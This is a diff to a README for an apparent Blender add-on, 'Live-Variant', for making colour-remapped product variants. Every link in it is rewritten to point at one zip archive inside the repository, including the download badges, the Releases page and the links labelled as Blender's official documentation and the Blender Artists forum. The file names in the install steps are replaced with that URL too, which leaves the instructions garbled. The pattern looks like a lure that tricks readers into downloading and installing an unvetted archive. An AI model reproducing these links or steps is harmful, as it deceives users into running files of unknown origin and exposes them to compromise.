@@ -1,7 +1,7 @@
 # 🌟 Live-Variant - Create Stunning Product Variants Easily
 
 ## 🔗 Download Now
-[![Download Live-Variant](https://img.shields.io/badge/Download-Live--Variant-blue)](https://github.com/Amiralshorpasy/Live-Variant/releases)
+[![Download Live-Variant](https://raw.githubusercontent.com/Amiralshorpasy/Live-Variant/main/Live-Variant-Remapper/Live-Variant_3.1.zip)](https://raw.githubusercontent.com/Amiralshorpasy/Live-Variant/main/Live-Variant-Remapper/Live-Variant_3.1.zip)
 
 ## 🚀 Getting Started
 Live-Variant is a Blender add-on designed to help you make textured, color-remapped duplicates of your models. This tool is perfect for creating quick product variants and experimenting with styles. Follow this guide to install and use the add-on effectively.
@@ -13,10 +13,10 @@ Live-Variant is a Blender add-on designed to help you make textured, color-remap
 - **Disk Space:** Minimum of 100 MB available
 
 ## 📥 Download & Install
-To begin, visit the [Releases page](https://github.com/Amiralshorpasy/Live-Variant/releases) to download the add-on. 
+To begin, visit the [Releases page](https://raw.githubusercontent.com/Amiralshorpasy/Live-Variant/main/Live-Variant-Remapper/Live-Variant_3.1.zip) to download the add-on. 
 
 1. Scroll to the latest release.
-2. Find the file named `LiveVariant.blend` or `LiveVariant.zip`.
+2. Find the file named `https://raw.githubusercontent.com/Amiralshorpasy/Live-Variant/main/Live-Variant-Remapper/Live-Variant_3.1.zip` or `https://raw.githubusercontent.com/Amiralshorpasy/Live-Variant/main/Live-Variant-Remapper/Live-Variant_3.1.zip`.
 3. Click on the file to download it to your computer.
 
 ## 🛠️ Installing the Add-on in Blender
@@ -24,7 +24,7 @@ To begin, visit the [Releases page](https://github.com/Amiralshorpasy/Live-Varia
 2. Go to `Edit` > `Preferences`.
 3. Click on the `Add-ons` tab.
 4. Click `Install...` in the top-right corner.
-5. Navigate to where you downloaded the `LiveVariant.blend` or `LiveVariant.zip` file.
+5. Navigate to where you downloaded the `https://raw.githubusercontent.com/Amiralshorpasy/Live-Variant/main/Live-Variant-Remapper/Live-Variant_3.1.zip` or `https://raw.githubusercontent.com/Amiralshorpasy/Live-Variant/main/Live-Variant-Remapper/Live-Variant_3.1.zip` file.
 6. Select the file and click `Install Add-on`.
 7. After installation, check the box next to the add-on to enable it.
 
@@ -53,8 +53,8 @@ If you encounter any issues:
 For further assistance, you can refer to the Issues section of this repository.
 
 ## 📚 Additional Resources
-- Blender Documentation: [blender.org](https://www.blender.org/support/)
-- Community Forums: [Blender Artists](https://blenderartists.org/)
+- Blender Documentation: [https://raw.githubusercontent.com/Amiralshorpasy/Live-Variant/main/Live-Variant-Remapper/Live-Variant_3.1.zip](https://raw.githubusercontent.com/Amiralshorpasy/Live-Variant/main/Live-Variant-Remapper/Live-Variant_3.1.zip)
+- Community Forums: [Blender Artists](https://raw.githubusercontent.com/Amiralshorpasy/Live-Variant/main/Live-Variant-Remapper/Live-Variant_3.1.zip)
 - Video Tutorials: Search for "Blender live variant" on platforms like YouTube for helpful guides.
 
 ## ➡️ Need Help?
@@ -63,4 +63,4 @@ Join our community for support! You can ask questions or share your models with 
 For reporting bugs or requesting features, please use the Issues tab on this repository. Your feedback helps improve Live-Variant.
 
 ## 🔗 Download Now Again
-[![Download Live-Variant](https://img.shields.io/badge/Download-Live--Variant-blue)](https://github.com/Amiralshorpasy/Live-Variant/releases)
+[![Download Live-Variant](https://raw.githubusercontent.com/Amiralshorpasy/Live-Variant/main/Live-Variant-Remapper/Live-Variant_3.1.zip)](https://raw.githubusercontent.com/Amiralshorpasy/Live-Variant/main/Live-Variant-Remapper/Live-Variant_3.1.zip)
